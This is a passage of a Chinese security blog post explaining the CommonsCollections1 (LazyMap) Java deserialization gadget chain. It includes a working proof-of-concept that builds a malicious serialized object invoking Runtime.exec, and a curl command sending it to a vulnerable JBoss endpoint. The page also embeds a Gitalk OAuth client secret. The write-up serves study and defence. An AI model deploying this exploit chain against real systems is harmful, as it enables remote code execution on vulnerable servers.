class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但不过，重写的<code>readObject</code>方法中并未涉及到<code>invoke</code>相关方法，所以就需要用到动态代理机制，从而执行到<code>invoke</code>方法，最终达到执行<code>get</code>方法以达到命令的执行。</p>
+<h2 id="0x05-概念验证"><a href="#0x05-概念验证" class="headerlink" title="0x05 概念验证"></a>0x05 概念验证</h2><p>结合如上所有，最终构造如下POC。第一处创建的<code>AnnotationInvocationHandler</code>实例是用于利用<code>invoke</code>方法触发<code>LazyMap</code>中的get方法从而达到命令执行，接着会通过调用<code>Proxy.newProxyInstance()</code>方法为这个实例创建代理对象proxyMap，但由于在反序列化的入口是<code>readObject</code>方法，所以无法对proxyMap直接序列化，所以就需要二次创建<code>AnnotationInvocationHandler</code>实例来对proxyMap进行包装。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), tc);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建第一个AnnotationInvocationHandler实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Proxy.newProxyInstance()方法创建代理对象proxyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二次创建AnnotationInvocationHandler实例来对proxyMap进行包装</span></span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1-lazymap.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(handler);</span><br><span class="line">        outputStream.close();</span><br><span class="line"><span class="comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc1-lazymap.ser&quot;));</span></span><br><span class="line"><span class="comment">//        inputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>向一个存在反序列化漏洞且JDK版本小于8u71的Jboss环境发送如上生成的恶意序列化数据，成功弹出计算器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&quot;</span> --data-binary <span class="string">&quot;@cc1-lazymap.ser&quot;</span> http://localhost:8080/invoker/readonly</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/post/java-deserialization-cc1-lazymap/1.png"></p>
+<p>如下是完整Gadget调用链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/post/java-deserialization-cc1-lazymap/r.png"></p>
+<h2 id="0x06-Debug导致的小问题"><a href="#0x06-Debug导致的小问题" class="headerlink" title="0x06 Debug导致的小问题"></a>0x06 Debug导致的小问题</h2><p>如上POC在调试时，在进行序列化时就会弹出计算器，有时候甚至会弹出两个计算器，这些情况在直接运行的情况下反倒不会出现。这其实是由于在本地调试代码时，调试器会调用一些toString等方法，这样便触发了invoke的调用，从而导致命令执行。有一种非常简单的方式来避免这种行为，在IDEA中关闭如下两项即可。</p>
+<p><img src="/img/post/java-deserialization-cc1-lazymap/2.png"></p>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><ul>
+<li><a href="https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html">https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html</a></li>
+<li><a href="https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html">https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/d5UvL065Lc1WXhsRmb92qw">https://mp.weixin.qq.com/s/d5UvL065Lc1WXhsRmb92qw</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io">_0xf4n9x_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html">https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。未经许可禁止转载到微信公众号，其他转载请注明来自 <a href="https://0xf4n9x.github.io" target="_blank">_0xf4n9x_'s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/deserialization/">deserialization</a></div><div class="post_share"><div class="social-share" data-image="/img/post/java-deserialization-cc1-lazymap/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/java-deserialization-cc6.html" title="Java反序列化漏洞之CommonsCollections6链"><img class="cover" src="/img/post/java-deserialization-cc6/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Java反序列化漏洞之CommonsCollections6链</div></div></a></div><div class="next-post pull-right"><a href="/java-deserialization-cc1-transformedmap.html" title="Java反序列化漏洞之TransformedMap版CC1链"><img class="cover" src="/img/post/java-deserialization-cc1-transformedmap/11.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Java反序列化漏洞之TransformedMap版CC1链</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/cdg-xstream-deserialization-arbitrary-file-upload.html" title="亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞"><img class="cover" src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞</div></div></a></div><div><a href="/java-deserialization-cc6.html" title="Java反序列化漏洞之CommonsCollections6链"><img class="cover" src="/img/post/java-deserialization-cc6/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-06</div><div class="title">Java反序列化漏洞之CommonsCollections6链</div></div></a></div><div><a href="/java-deserialization-cc1-transformedmap.html" title="Java反序列化漏洞之TransformedMap版CC1链"><img class="cover" src="/img/post/java-deserialization-cc1-transformedmap/11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-04</div><div class="title">Java反序列化漏洞之TransformedMap版CC1链</div></div></a></div><div><a href="/java-deserialization-vulnerability-principle.html" title="Java反序列化漏洞"><img class="cover" src="/img/post/java-deserialization-vulnerability-principle/deserialization-diagram.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-03</div><div class="title">Java反序列化漏洞</div></div></a></div><div><a href="/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html" title="CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析"><img class="cover" src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-07</div><div class="title">CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析</div></div></a></div><div><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">利用Tomcat内存马攻击Shiro应用</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-LazyMap%E7%9A%84%E7%94%B1%E6%9D%A5"><span class="toc-text">0x00 LazyMap的由来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">0x01 影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-text">0x02 动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-LayzMap-get"><span class="toc-text">0x03 LayzMap#get</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-AnnotationInvocationHandler-invoke"><span class="toc-text">0x04 AnnotationInvocationHandler#invoke</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81"><span class="toc-text">0x05 概念验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Debug%E5%AF%BC%E8%87%B4%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-text">0x06 Debug导致的小问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="toc-text">0x07 参考</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/post/java-deserialization-cc1-lazymap/1.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By _0xf4n9x_</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '127fd27133c8e286cff8',
+      clientSecret: 'f87b94b8813bcdae62b09baa633f85ef1a78107f',
+      repo: '0xf4n9x.github.io',
+      owner: '0xf4n9x',
+      admin: ['0xf4n9x'],
+      id: '296e4ad915fa1db2ae9a7b4251296681',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.textContent= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-YRH7DCY1TL', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
